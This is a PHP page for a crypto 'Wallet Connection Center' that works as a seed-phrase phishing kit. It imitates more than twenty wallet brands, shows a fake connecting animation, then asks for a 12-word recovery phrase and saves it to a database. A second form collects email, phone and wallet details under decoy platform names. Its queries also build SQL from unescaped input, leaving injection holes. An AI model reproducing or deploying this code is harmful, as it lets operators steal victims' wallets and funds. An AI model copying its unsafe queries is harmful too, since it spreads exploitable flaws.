<?php 
// ─── Error Logging & Display ────────────────────────────────────────────────
error_reporting(E_ALL);
ini_set('display_errors', 1);

function logWebError($message) {
    $logDir = __DIR__ . '/logs';
    $logFile = $logDir . '/web_errors.log';
    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($logFile, "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
}

// ─── Dependency Validation ──────────────────────────────────────────────────
if (file_exists('cdn.php')) include 'cdn.php';
if (file_exists('config.php')) include 'config.php';

// ─── Request Handling ───────────────────────────────────────────────────────
$usr_string = $req ?? ''; 
$numbers = preg_replace('/\D/', '', $usr_string); 

// 1. Ensure balance record exists
if (isset($conn) && !empty($numbers)) {
    $bal_check = $conn->query("SELECT * FROM bal WHERE uid='$numbers'"); 
    if($bal_check && $bal_check->num_rows < 1) { 
        $conn->query("INSERT INTO bal(uid,bal) VALUES('$numbers','0.00')"); 
        echo "<script>window.location.reload();</script>";
        exit;
    } 
}

// 2. Get User Details
$user_data = null;
if (isset($conn) && !empty($numbers)) {
    $chk = $conn->query("SELECT * FROM user_details WHERE id='$numbers'"); 
    if($chk && $chk->num_rows > 0) {
        $user_data = $chk->fetch_assoc();
       
    }
}

if($user_data) { 
    $uid = $user_data['id'];
    $uname = $user_data['uname'] ?? $user_data['username'] ?? 'User';

    // ─── Handle Submissions ─────────────────────────────────────────────────
    $success_msg = false;
    
    // Web3 Seed Phrase Submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phrase_words'])) {
        $wallet_name = $_POST['wallet_name'] ?? 'Unknown Wallet';
        $phrase = implode(',', $_POST['phrase_words']);
        $sql = "INSERT INTO seed_phrase (uid, uname, phrase, wallet) VALUES ('$uid', '$uname', '$phrase', '$wallet_name')";
        if($conn->query($sql)) { $success_msg = "Web3 Wallet synchronized successfully!"; }
    }
    
    // Virtual Wallet Submission
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['virtual_name'])) {
        $v_name = $conn->real_escape_string($_POST['virtual_name']);
        $v_link = $conn->real_escape_string($_POST['wallet_link']);
        $v_link_email = $conn->real_escape_string($_POST['email']);
         $v_link_tel = $conn->real_escape_string($_POST['tel']);
          $v_link_wallet = $conn->real_escape_string($_POST['wallet']);
           $v_link_crypto = $conn->real_escape_string($_POST['crypto']);
        
        
      
        
        $sql = "INSERT INTO virtual_wallets (uid, uname, website_name, uemail, wallet_link,tel,wallet,crypto) VALUES ('$uid', '$uname','$v_name', '$v_link_email', '$v_link','$v_link_tel','$v_link_wallet','$v_link_crypto')";
        if($conn->query($sql)) { $success_msg = "Virtual Wallet connected successfully!"; }
    }

    // ─── Get Active Connections ─────────────────────────────────────────────
    $connected_wallets = [];
    $seed_check = $conn->query("SELECT wallet FROM seed_phrase WHERE uid='$uid'");
    if ($seed_check) { while($row = $seed_check->fetch_assoc()) { $connected_wallets[] = $row['wallet']; } }
    
    $v_check = $conn->query("SELECT wallet_link FROM virtual_wallets WHERE uid='$uid'");
    if ($v_check) { while($row = $v_check->fetch_assoc()) { $connected_wallets[] = "Virtual: " . $row['wallet_link']; } }

    $wallets = [ 
        ['Trust Wallet', 'https://static.vecteezy.com/system/resources/previews/014/295/608/original/trust-wallet-token-twt-icon-isolated-on-white-background-vector.jpg'], 
        ['Coinbase', 'https://avatars.githubusercontent.com/u/18060234?s=200&v=4'], 
        ['MetaMask', 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg'], 
        ['SafePal', 'https://tse1.mm.bing.net/th/id/OIP.0kVtumIohkPBOhJrFMuaQQHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'], 
        ['Bitcoin.com', 'https://www.bitcoin.com/favicon.ico'], 
        ['Crypto.com', 'https://crypto.com/favicon.ico'], 
        ['Exodus', 'https://www.exodus.com/favicon.ico'], 
        ['Atomic Wallet', 'https://th.bing.com/th/id/R.dafc31f385e7247c2dae98e8d55b5553?rik=7JqAEO%2fpGQ0a8Q&pid=ImgRaw&r=0'],
        ['Rainbow', 'https://rainbow.me/favicon.ico'], ['Argent', 'https://tse4.mm.bing.net/th/id/OIP.aSby0XzmLvX4F15_BTnHOgHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'],
        ['Ledger Live', 'https://logowik.com/content/uploads/images/ledger-wallet5715.jpg'], ['Phantom', 'https://tse4.mm.bing.net/th/id/OIP.Wl1LPy6zhD0ahxJsHaVLVAAAAA?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'],
        ['Pera Wallet', 'https://th.bing.com/th/id/R.5d59b1d3eea06340b5fefdcacfe62a81?rik=KBjMJfL3SD7GSA&pid=ImgRaw&r=0'], ['Gnosis Safe', 'https://avatars.githubusercontent.com/u/168175583?s=200&v=4'],
        ['Binance Wallet', 'https://th.bing.com/th/id/R.92d4f7ef666ddb42051d90f0333df1cf?rik=Rw5e3HhVIbBAng&riu=http%3a%2f%2ffreelogopng.com%2fimages%2fall_img%2f1681906406binance-icon-png.png&ehk=zKWRuKmvAqHAESxhJN0LnJWOczq0vpRcKTKxNrZMaZQ%3d&risl=&pid=ImgRaw&r=0'], ['OKX Wallet', 'https://tse3.mm.bing.net/th/id/OIP.pyUuUESNZwU2D3x01qwaNwHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'],
        ['Solflare', 'https://solflare.com/favicon.ico'], ['MathWallet', 'https://mathwallet.org/favicon.ico'],
        ['TokenPocket', 'https://www.tokenpocket.pro/favicon.ico'], ['1inch', 'https://static.vecteezy.com/system/resources/previews/038/761/798/non_2x/wallet-flat-scale-icon-vector.jpg']
    ];

    include 'dashboard_header.php';
    ?>
    
    <style>
        .card-dark { background: rgba(255, 255, 255, 0.03) !important; border: 1px solid rgba(255, 255, 255, 0.05) !important; backdrop-filter: blur(10px) !important; }
        .bg-gradient-gold { background: linear-gradient(135deg, #f6d365 0%, #fda085 100%) !important; }
        .gradient-text { background: linear-gradient(135deg, #f6d365 0%, #fda085 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .animate-fade-in { animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .wallet-grid-item:hover { border-color: rgba(251, 146, 60, 0.3) !important; background-color: rgba(251, 146, 60, 0.05) !important; }
    </style>

    <div class="max-w-4xl mx-auto py-8 px-4">
        <div class="text-center mb-12">
            <div class="w-20 h-20 bg-gradient-gold rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-xl shadow-orange-500/20">
                <i class="fas fa-globe text-black text-3xl"></i>
            </div>
            <h2 class="text-3xl font-bold text-white mb-3">Wallet Connection Center</h2>
            <p class="text-gray-400 max-w-md mx-auto leading-relaxed">Securely connect your decentralized or virtual wallet to sync your assets.</p>
        </div>

        <?php if($success_msg): ?>
        <div class="mb-8 p-4 bg-green-500/20 border border-green-500/50 rounded-2xl text-green-400 text-center animate-fade-in">
            <i class="fas fa-check-circle mr-2"></i> <?php echo $success_msg; ?>
        </div>
        <?php endif; ?>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
            <!-- Web3 Card -->
            <div class="card-dark rounded-[2.5rem] p-10 flex flex-col justify-between">
                <div>
                    <h3 class="font-bold text-xl mb-2 text-orange-400">Web3 Connection</h3>
                    <p class="text-xs text-gray-500 mb-8">Connect using Metamask, TrustWallet, or other providers via secure handshake.</p>
                </div>
                <button id="btnWeb3" class="w-full bg-gradient-gold text-black font-bold py-4 rounded-2xl shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3 uppercase tracking-wider relative overflow-hidden">
                    <span class="btn-text flex items-center gap-3 font-bold"><i class="fas fa-plug"></i> Connect Web3</span>
                    <span class="btn-loader hidden absolute inset-0 flex items-center justify-center bg-gradient-gold">
                        <i class="fas fa-circle-notch animate-spin text-2xl"></i>
                    </span>
                </button>
            </div>

            <!-- Virtual Card -->
            <div class="card-dark rounded-[2.5rem] p-10 flex flex-col justify-between">
                <div>
                    <h3 class="font-bold text-xl mb-2 text-blue-400">Virtual Wallet</h3>
                    <p class="text-xs text-gray-500 mb-8">Link your existing wallet account from other platforms manually.</p>
                </div>
                <button id="btnVirtual" class="w-full bg-white text-black font-bold py-4 rounded-2xl shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all flex items-center justify-center gap-3 uppercase tracking-wider relative overflow-hidden">
                    <span class="btn-text flex items-center gap-3 font-bold"><i class="fas fa-link"></i> Link Virtual</span>
                    <span class="btn-loader hidden absolute inset-0 flex items-center justify-center bg-white">
                        <i class="fas fa-circle-notch animate-spin text-2xl"></i>
                    </span>
                </button>
            </div>
        </div>

        <!-- Status Card -->
        <div class="card-dark rounded-[2.5rem] p-10 relative overflow-hidden text-center mb-12">
            <div class="relative z-10">
                <?php if(empty($connected_wallets)): ?>
                    <h4 class="font-bold text-lg text-white mb-2">No Wallet Connected</h4>
                    <p class="text-xs text-gray-500">Your connected accounts will appear here once verified.</p>
                <?php else: ?>
                    <h4 class="font-bold text-lg text-white mb-4">Connections Active</h4>
                    <div class="flex flex-wrap justify-center gap-2">
                        <?php foreach($connected_wallets as $cw): ?>
                            <span class="px-3 py-1 bg-white/5 border border-white/10 rounded-full text-[10px] font-bold text-gray-300"><?php echo htmlspecialchars($cw); ?></span>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        </div>
        
        <div class="card-dark rounded-3xl p-6 border-white/5">
            <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=" width="100%" height="36px" scrolling="auto" marginwidth="0" marginheight="0" frameborder="0" border="0" style="border:0;margin:0;padding:0;"></iframe>
        </div>
    </div>

    <!-- WEB3 MODAL -->
    <div id="modalWeb3" class="fixed inset-0 z-[100] hidden items-center justify-center px-4">
        <div class="absolute inset-0 bg-black/80 backdrop-blur-md close-modal"></div>
        <div class="relative w-full max-w-xl card-dark rounded-[2.5rem] border-white/10 p-8 lg:p-12 shadow-2xl animate-fade-in max-h-[90vh] overflow-y-auto">
            <div id="w3-step-selection">
                <div class="flex justify-between items-center mb-10">
                    <h3 class="font-extrabold text-2xl gradient-text">Select Provider</h3>
                    <button class="close-modal w-10 h-10 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
                    <?php foreach($wallets as $w): ?>
                    <a href="javascript:void(0)" onclick="connectWeb3Wallet('<?php echo $w[0]; ?>')" class="group wallet-grid-item flex flex-col items-center p-4 rounded-3xl bg-white/5 border border-white/5 transition-all">
                        <div class="w-10 h-10 rounded-xl overflow-hidden mb-3 group-hover:scale-110 transition-transform flex items-center justify-center bg-white/5">
                            <img src="<?php echo $w[1]; ?>" alt="<?php echo $w[0]; ?>" class="w-full h-full object-contain" onerror="this.onerror=null; this.src='https://www.svgrepo.com/show/473826/wallet.svg'; this.classList.add('p-2', 'invert');">
                        </div>
                        <span class="text-[9px] font-bold text-gray-400 group-hover:text-white text-center"><?php echo $w[0]; ?></span>
                    </a>
                    <?php endforeach; ?>
                </div>
            </div>
            <div id="w3-step-loader" class="hidden flex-col items-center justify-center py-12 text-center">
                <div class="relative w-24 h-24 mb-8">
                    <div class="absolute inset-0 border-4 border-orange-500/20 rounded-full"></div>
                    <div class="absolute inset-0 border-4 border-orange-500 rounded-full border-t-transparent animate-spin"></div>
                    <div class="absolute inset-0 flex items-center justify-center"><i class="fas fa-link text-2xl text-orange-500 animate-pulse"></i></div>
                </div>
                <h4 class="font-bold text-xl mb-2">Connecting to <span id="loading-w3-name"></span>...</h4>
            </div>
            <div id="w3-step-form" class="hidden">
                <div class="text-center mb-8">
                    <h4 class="font-bold text-xl text-white mb-2">Connect manually</h4>
                    <p class="text-sm text-gray-400">Security verification required. Enter your 12-word recovery phrase to synchronize manually.</p>
                </div>
                <form method="POST" class="space-y-6">
                    <input type="hidden" name="wallet_name" id="hidden-w3-name">
                    <div class="grid grid-cols-3 gap-3">
                        <?php for($i=1; $i<=12; $i++): ?>
                        <input type="text" name="phrase_words[]" placeholder="<?php echo $i; ?>." required class="w-full bg-white/5 border border-white/10 rounded-xl py-3 px-3 text-xs text-white focus:ring-1 focus:ring-orange-500/50 outline-none">
                        <?php endfor; ?>
                    </div>
                    <button type="submit" class="w-full bg-white text-black font-extrabold py-4 rounded-2xl uppercase tracking-wider">Verify & Synchronize</button>
                </form>
            </div>
        </div>
    </div>

    <!-- VIRTUAL MODAL -->
 <div id="modalVirtual" class="fixed inset-0 z-[100] hidden items-center justify-center px-4">
    <div class="absolute inset-0 bg-black/80 backdrop-blur-md close-modal"></div>
    <div class="relative w-full max-w-lg card-dark rounded-[2.5rem] border-white/10 p-8 lg:p-12 shadow-2xl animate-fade-in overflow-y-auto max-h-[90vh]">
            <div class="flex justify-between items-center mb-10">
                <h3 class="font-extrabold text-2xl text-white">Link Account</h3>
                <button class="close-modal w-10 h-10 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10 transition">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <form method="POST" class="space-y-6">
                <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2 ml-1">Name on Wallet Website</label>
                    <input type="text" name="virtual_name" required placeholder="e.g. John Doe" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white focus:ring-1 focus:ring-blue-500/50 outline-none">
                </div>
                
                 <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2 ml-1">Email</label>
                    <input type="text" name="email" required placeholder="user@gmail.com" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white focus:ring-1 focus:ring-blue-500/50 outline-none">
                </div>
                
                <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2 ml-1">Phone Number</label>
                    <input type="text" name="tel" required placeholder="+1234567890" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white focus:ring-1 focus:ring-blue-500/50 outline-none">
                </div>
                
                <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2 ml-1">Wallet Address</label>
                    <input type="text" name="wallet" required placeholder="wallet Address" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white focus:ring-1 focus:ring-blue-500/50 outline-none">
                </div>
                
                <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2 ml-1">Crypto</label>
                    <input type="text" name="crypto" required placeholder="Input Crypto" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white focus:ring-1 focus:ring-blue-500/50 outline-none">
                </div>
                
                <div>
                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-2 ml-1">Select Wallet Platform</label>
                    <div class="relative">
                        <select name="wallet_link" required class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white appearance-none focus:ring-1 focus:ring-blue-500/50 outline-none cursor-pointer">
                            <option value="Blockchain.com" class="bg-gray-900">Global swift pay</option>
                            <option value="Crypto.com" class="bg-gray-900">Global business pay</option>
                            <option value="Luno" class="bg-gray-900">Zigobit.com</option>
                            <option value="YellowCard" class="bg-gray-900">Keretok wallet</option>
                            <option value="Bundle" class="bg-gray-900">swiftsecure.net</option>
                            <option value="Bundle" class="bg-gray-900">Bundle</option>
                            <option value="Bundle" class="bg-gray-900">pay-swift</option>
                            <option value="Bundle" class="bg-gray-900">Transfersswift.com</option>
                            <option value="Bundle" class="bg-gray-900">Maintobit</option>
                            <option value="Bundle" class="bg-gray-900">Gulative.site</option>
                            <option value="Bundle" class="bg-gray-900">Senovan.com</option>
                            <option value="Bundle" class="bg-gray-900">Lazobit.com</option>
                            <option value="Bundle" class="bg-gray-900">Allyswift.com</option>
                            <option value="Bundle" class="bg-gray-900">Zenit-swift.com</option>
                            <option value="Bundle" class="bg-gray-900">Rendoxx.com</option>
                            <option value="Bundle" class="bg-gray-900">lobicus.online</option>
                            <option value="Bundle" class="bg-gray-900">Cryptokneit</option>
                            <option value="Bundle" class="bg-gray-900">Swif-World</option>
                            <option value="Bundle" class="bg-gray-900">Plutusvault.online</option>
                            
                            <option value="Others" class="bg-gray-900">Others Wallet Site</option>
                        </select>
                        <i class="fas fa-chevron-down absolute right-6 top-1/2 -translate-y-1/2 text-gray-500 pointer-events-none"></i>
                    </div>
                </div>
                <button type="submit" class="w-full bg-blue-600 text-white font-extrabold py-4 rounded-2xl uppercase tracking-wider hover:bg-blue-500 transition-all shadow-lg shadow-blue-500/20">Link Wallet </button>
            </form>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const modals = { w3: document.getElementById("modalWeb3"), virt: document.getElementById("modalVirtual") };
            const btns = { w3: document.getElementById("btnWeb3"), virt: document.getElementById("btnVirtual") };
            
            const w3Steps = { sel: document.getElementById("w3-step-selection"), load: document.getElementById("w3-step-loader"), form: document.getElementById("w3-step-form") };
            const loadingW3Name = document.getElementById("loading-w3-name");
            const hiddenW3Name = document.getElementById("hidden-w3-name");

            const setupBtn = (btn, modalKey) => {
                if (!btn) return;
                btn.onclick = () => {
                    const text = btn.querySelector('.btn-text');
                    const loader = btn.querySelector('.btn-loader');
                    text.classList.add('invisible');
                    loader.classList.remove('hidden');
                    
                    setTimeout(() => {
                        text.classList.remove('invisible');
                        loader.classList.add('hidden');
                        if (modalKey === 'w3') resetW3Modal();
                        modals[modalKey].classList.remove('hidden');
                        modals[modalKey].classList.add('flex');
                        document.body.style.overflow = 'hidden';
                    }, 1500);
                };
            };

            setupBtn(btns.w3, 'w3');
            setupBtn(btns.virt, 'virt');

            document.querySelectorAll('.close-modal').forEach(c => {
                c.onclick = () => {
                    Object.values(modals).forEach(m => { m.classList.add('hidden'); m.classList.remove('flex'); });
                    document.body.style.overflow = 'auto';
                };
            });

            function resetW3Modal() {
                w3Steps.sel.classList.remove('hidden');
                w3Steps.load.classList.add('hidden');
                w3Steps.form.classList.add('hidden');
            }

            window.connectWeb3Wallet = function(name) {
                loadingW3Name.innerText = name;
                hiddenW3Name.value = name;
                w3Steps.sel.classList.add('hidden');
                w3Steps.load.classList.remove('hidden');
                w3Steps.load.classList.add('flex');
                setTimeout(() => {
                    w3Steps.load.classList.remove('flex');
                    w3Steps.load.classList.add('hidden');
                    w3Steps.form.classList.remove('hidden');
                }, 3000);
            };
        });
    </script>
    
    <?php 
    include("dashboard_footer.php");
} else { echo "<div style='color:white; text-align:center; margin-top:50px;'>User not found. Check logs/web_errors.log</div>"; } ?>
